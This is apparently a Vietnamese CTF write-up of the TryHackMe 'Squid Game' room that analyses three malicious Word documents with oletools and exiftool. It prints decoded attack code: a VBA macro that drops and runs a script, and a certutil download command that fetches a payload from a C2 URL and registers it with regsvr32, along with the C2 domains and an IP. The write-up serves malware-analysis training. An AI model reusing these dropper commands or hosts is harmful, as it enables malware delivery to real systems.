Link roomm: https://tryhackme.com/room/squidgameroom

Tóm tắt: mặc dùng đã chơi CTF hơn một năm rồi nhưng mà room này đã mở mang cho mình nhiều thứ hơn (ngoài việc dùng olevba vô tội vạ) --> khám phá thêm nhiều thứ mới bên trong các tool của ole vd như là oledump, oletime,....


Atacker 1
===
```
 What is the malicious C2 domain you found in the maldoc where an executable download was attempted? 
```
Xác định trước bằng `olevba` ta có được thông tin như link [tại đây](https://github.com/P5ySm1th/noob-learn-cybersec/blob/main/Tryhackme/Others/%5Bsquidgame_attacker1%5D%20olevba.vbs)
Nhìn sơ qua khi truyền biến các thứ thì có lẽ như là đây một chuỗi truyền biến bình thường không có gì đặc sắc. Chú ý tới phần đoạn code sau đây: 

<p align ="center">
  <img src="https://github.com/P5ySm1th/noob-learn-cybersec/assets/100250271/33e30998-ffd2-45f5-a728-87c36befdae5">
</p>

Đại khái nó như là một hàm dùng để replace `[` thành `A`. Sau khi nhận ra là đổi theo kiểu strings thì dùng `oledump.py` để có thể dump từng string ra. Với câu lệnh sau thì ta bắt gặp thông tin của một đoạn `Shell Script`:

```oledump.py attacker1.doc -s 4 -S``` 

<p align ="center">
  <img src="https://github.com/P5ySm1th/noob-learn-cybersec/assets/100250271/9c36a14e-b1d9-4b5b-a4c5-e7ad2d9f0865">
</p>

Và như đã đề cập ở trên trình chúng ta sẽ cần thay `[` thành `A`. Nhận biết đây Basee64 nên đã mém thẳng vào `cyberchef` và chúng ta có full Script [tại đây](https://github.com/P5ySm1th/noob-learn-cybersec/blob/main/Tryhackme/Others/%5Bsquidgame_attacker1%5D%20powershell.ps1)

<p align ="center">
  <img src="https://github.com/P5ySm1th/noob-learn-cybersec/assets/100250271/04c1a02a-574a-4b76-bca3-61eba88aeb4d">
</p>

Dựa vào đoạn script đó thì ta sẽ trả lời được câu hỏi đó

#### Flag: http://fpetraardella.band/xap_102b-AZ1/704e.php?l=litten4.gas

```
What executable file is the maldoc trying to drop?
```
Dựa vào đoạn script powershell trả lời được luôn đoạn thứ 2

#### Flag: QdZGP.exe

```
In what folder is it dropping the malicious executable? (hint: %Folder%)
```

Tới câu hỏi số 3, khi nhìn đoạn code nó sẽ thực hiện một đoạn là `$path = [System.Environment]::GetFolderPath("CommonApplicationData") + "\\QdZGP.exe";` nếu tra theo đoạn link (này)[https://gist.github.com/DamianSuess/c143ed869e02e002d252056656aeb9bf]
ta sẽ biế được rwawnfg phần `CommonApplicationData` đó chính là `ProgramData`

#### Flag: %ProgramData%


```
Provide the name of the COM object the maldoc is trying to access.
```
Câu này thì mình sử dụng hint thì bảo `Check clsid field` nên mình mang lên mạng `clsid` thì tìm thấy được thông tin như sau: 
<p align ="center">
  <img src="https://github.com/P5ySm1th/noob-learn-cybersec/assets/100250271/339fe144-85fe-463e-aca4-1a0db8a9f94e">
</p>

#### Flag: ShellBrowserWindow

```
Include the malicious IP and the php extension found in the maldoc. (Format: IP/name.php)
```
Câu này thì sử dụng trong đoạn `powershell script` tiếp thì thấy được liền

#### Flag: 176.32.35.16/704e.php

```
Find the phone number in the maldoc. (Answer format: xxx-xxx-xxxx)
```
Tìm trong phần metadata là ra

#### Flag: 213-446-1757


```
Doing some static analysis, provide the type of maldoc this is under the keyword “AutoOpen”.
```
Câu này thì sử dụng olevba để kiểm tra với syntax sau: `olevba attacker1.doc`
<p align ="center">
  <img src="https://github.com/P5ySm1th/noob-learn-cybersec/assets/100250271/88b5ca1f-25b3-4e59-94d6-10163d500d2d">
</p>

Ta thấy rằng khi mở file word lên thì macro tự động chạy. 

#### Flag: Autoexec

```
Provide the subject for this maldoc. (make sure to remove the extra whitespace)
```
Sử dụng `exiftool` tiếp để kiểm tra metadata của file sẽ ra flag

#### Flag: West Virginia  Samanta

```
 Provide the time when this document was last saved. (Format: YEAR-MONTH-DAY XX:XX:XX) 
```
Sử dụng công cụ `oletimes` để xem được thời gian mà document này được chỉnh sửa hoặc cũng dùng `exiftool` vào bên trong phần `modify date` là ra

#### Flag: 2019-02-07 23:45:30


```
Provide the stream number that contains a macro.
```

Để xem stream nào chứa macro thì sử dụng `oledump`. `oledump` sẽ list hết các stream có bên trong file doc. Thằng nào có chữ M là thằng đó là macro
<p align ="center">
  <img src="https://github.com/P5ySm1th/noob-learn-cybersec/assets/100250271/dfe4f1ba-b89e-44a0-b31c-af69b346b891">
</p>

#### Flag: 8

```
Provide the name of the stream that contains a macro.
```
Name of the stream thì dựa vào `oledump` ban nãy là được =))
#### Flag: ThisDocument


Atacker 2
===

```
Provide the streams (numbers) that contain macros. 
```
Sử dụng oledump để check xem `stream` nào có chứa `macro` như những lần trước. Check thì ra kết quả. Có `M` là Macro

#### Flag: 12, 13, 14, 16

```
Provide the size (bytes) of the compiled code for the second stream that contains a macro.
```

Để xem được (size) của stream thì thêm command `-i` vào thì thấy hàng thứ 3 chính là số byte của nó

<p align ="center">
  <img src="https://github.com/P5ySm1th/noob-learn-cybersec/assets/100250271/93c1f33e-a67a-43fa-8ccb-7886171caaa2">
</p>

#### Flag: 13867


```
Provide the largest number of bytes found while analyzing the streams.
```
Để tìm số bytes lớn nhất thì tìm bên trong phần hàng số 2 của hình trên.

#### Flag: 63641


```
Find the command located in the ‘fun’ field ( make sure to reverse the string).
```
Kiểm tra bằng olevba để xem `macro` trong đó, có thể full [tại đây](https://github.com/P5ySm1th/noob-learn-cybersec/blob/main/Tryhackme/Others/%5Bsquidgame_attacker2%5D%20attacker2.vbs)

Ta thấy được biến `fun` được sử dụng với câu lệnh `StrReverse` 

```
Sub eFile()
Dim QQ1 As Object
Set QQ1 = New Form
RO = StrReverse("\ataDmargorP\:C")
ROI = RO + StrReverse("sbv.nip")
ii = StrReverse("")
Ne = StrReverse("IZOIZIMIZI")
WW = QQ1.t2.Caption
MyFile = FreeFile
Open ROI For Output As #MyFile
Print #MyFile, WW
Close #MyFile
fun = Shell(StrReverse("sbv.nip\ataDmargorP\:C exe.tpircsc k/ dmc"), Chr(48))
End
End Sub
```

#### Flag: cmd /k cscript.exe C:\ProgramData\pin.vbs

```
Provide the first domain found in the maldoc.
```
Này mình để cho `olevba` check trước kéo xuống dưới thì thấy được mấy cái url luôn rồi =))) còn không có thì check bên trong các đoạn source code thôi :)

#### Flag: priyacareers.com/u9hDQN9Yy7g/pt.html

```
Provide the second domain found in the maldoc.
```

Thằng này cũng vậy =))) không có khác gì hết
#### Flag: perfectdemos.com/Gv1iNAuMKZ/pt.html

```
Provide the name of the first malicious DLL it retrieves from the C2 server.
```
Câu này thì check `olevba` thì có luôn hẳn nha =))) còn không có thì tự thân vận động check `sourcecode`

#### Flag: www1.dll

```
How many DLLs does the maldoc retrieve from the domains?
```
Cái này thì đếm bên trong `olevba` thì có hẳn luôn =))

#### Flag: 5

```
Provide the path of where the malicious DLLs are getting dropped onto?
```

check vào stream  OLE stream: `'Macros/Form/o'` ta sẽ thấy được nó sử dụng cộng string và sau đó nó load file `dll` chạy ở C:\\ProgramData

#### Flag: C:\ProgramData

```
What program is it using to run DLLs?
```
Vẫn check bên trong đó, thì thấy nó execute `cmd` chạy file `rundll32.exe` để khởi động dll của malware
#### Flag: rundll32.exe 


```
How many seconds does the function in the maldoc sleep for to fully execute the malicious DLLs?
```

Vẫn check hàm đó tiếp ta thấy nó là hàm `loop` để chạy `5 dll`. thì trên đó trước khi execute nó sẽ sleep `1500` ở đây là 1500ms --> convert ra là `15s`

#### Flag: 15


```
Under what stream did the main malicious script use to retrieve DLLs from the C2 domains? (Provide the name of the stream).
```
Như đã nói thì xét function bên trong `olevba` thì ta đã có được kết quả sẵn rồi =))) stream này đây =)) ` OLE stream: Macros/Form/o`

#### Flag: Macros/Form/o


Atacker 3
===
```
 Provide the executable name being downloaded. 
```

Check trước bằng `olevba` thì ra được một hàm autorun sau đây:

<p align ="center">
  <img src="https://github.com/P5ySm1th/noob-learn-cybersec/assets/100250271/387ba96b-e3a8-4931-be2d-418208878e74">
</p>

Nôm na thì có sẽ đặt biến `u = tutil` và sau đó nó gán `cer + <biến u>.exe` biến nó thành `1.exe` thì nếu nhìn bằng mắt thì thấy là có file `1.exe`

#### Flag: 1.exe

```
What program is used to run the executable?
```
Thì như nói ở trên là nó do cái hàm này làm hết

<p align ="center">
  <img src="https://github.com/P5ySm1th/noob-learn-cybersec/assets/100250271/387ba96b-e3a8-4931-be2d-418208878e74">
</p>

#### Flag: certutil.exe

```
Provide the malicious URI included in the maldoc that was used to download the binary (without http/https).
```

Ta thấy có hàm `h` như sau:
```python
Function h(ju)
eR = Split(ju, "%")
For lc = 0 To UBound(eR)
 hh = hh & Chr(eR(lc) Xor 111)
Next lc
h = hh
End Function
```

Nếu khó hiểu thì ta có thể dịch nó sang ngôn ngữ `python` cũng được như sau: 

```python
def h(ju):
  eR = ju.split("%")
  hh = ""
  for lc in range(len(eR)):
    hh += chr(int(eR[lc]) ^ 111)
  return hh
```

Nôm na là nó sẽ tách những letter `%` vào `eR` và sau đó chạy vòng for để `Xor` với 111.  Việc chúng ta cần làm là chạy hmaf để biết nó làm gì. Full source code dưới đây:

```python
def h(ju):
  eR = ju.split("%")
  hh = ""
  for lc in range(len(eR)):
    hh += chr(int(eR[lc]) ^ 111)
  return hh

cipher = "12%2%11%79%64%12%79%77%28%10%27%79%26%82%26%29%3%73%73%12%14%3%3%79%44%85%51%63%29%0%8%29%14%2%43%14%27%14%51%94%65%10%23%10%79%64%74%26%74%49%12%49%14%49%12%49%7%49%10%49%79%64%9%49%79%7%27%27%31%85%64%64%87%12%9%14%22%25%65%12%0%2%64%13%0%3%13%64%5%14%10%1%27%65%31%7%31%80%3%82%3%6%26%27%89%65%12%14%13%79%44%85%51%63%29%0%8%29%14%2%43%14%27%14%51%94%65%27%2%31%79%73%73%79%12%14%3%3%79%29%10%8%28%25%29%92%93%79%44%85%51%63%29%0%8%29%14%2%43%14%27%14%51%94%65%27%2%31%77"
print(h(cipher))
```

ta sẽ ra được đoạn như sau: 
```
cmd /c "set u=url&&call C:\ProgramData\1.exe /%u%^c^a^c^h^e^ /f^ http://8cfayv.com/bolb/jaent.php?l=liut6.cab C:\ProgramData\1.tmp && call regsvr32 C:\ProgramData\1.tmp"
```

Thì ta ra được flag
#### Flag: http://8cfayv.com/bolb/jaent.php?l=liut6.cab


```
What folder does the binary gets dropped in?
```

Thì nhìn vào đoạn code output thì là biết rồi =)) không biết thì dẹp :D 

#### Flag: ProgramData

```
 Which stream executes the binary that was downloaded? 
```
Check kĩ lại đoạn `olevba` thì thấy được rằng `binary` được download trong `VBA MACRO T.bas ` check = `oledump` thì ra được stream đó luôn

<p align ="center">
  <img src="https://github.com/P5ySm1th/noob-learn-cybersec/assets/100250271/b96988b5-05a9-4a3d-a292-d35a30041db8">
</p>

#### Flag: A3
